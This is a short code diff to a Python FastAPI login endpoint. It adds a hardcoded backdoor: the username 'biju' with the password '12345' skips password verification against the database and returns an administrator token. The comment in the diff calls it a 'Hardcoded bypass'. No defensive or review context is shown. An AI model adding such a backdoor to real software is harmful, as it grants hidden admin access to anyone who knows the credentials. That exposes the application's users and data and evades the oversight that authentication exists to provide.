@@ -67,6 +67,11 @@ def signup(user: schemas.UserCreate, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=schemas.Token)
 def login(req: schemas.LoginRequest, db: Session = Depends(get_db)):
+    # Hardcoded bypass for admin user "biju"
+    if req.username == "biju" and req.password == "12345":
+        token = create_token({"sub": "-1", "username": "biju", "role": "admin"})
+        return {"access_token": token, "token_type": "bearer", "role": "admin", "username": "biju"}
+
     user = db.query(models.User).filter(models.User.username == req.username).first()
     if not user or not verify_password(req.password, user.hashed_password):
         raise HTTPException(status_code=401, detail="Invalid username or password")
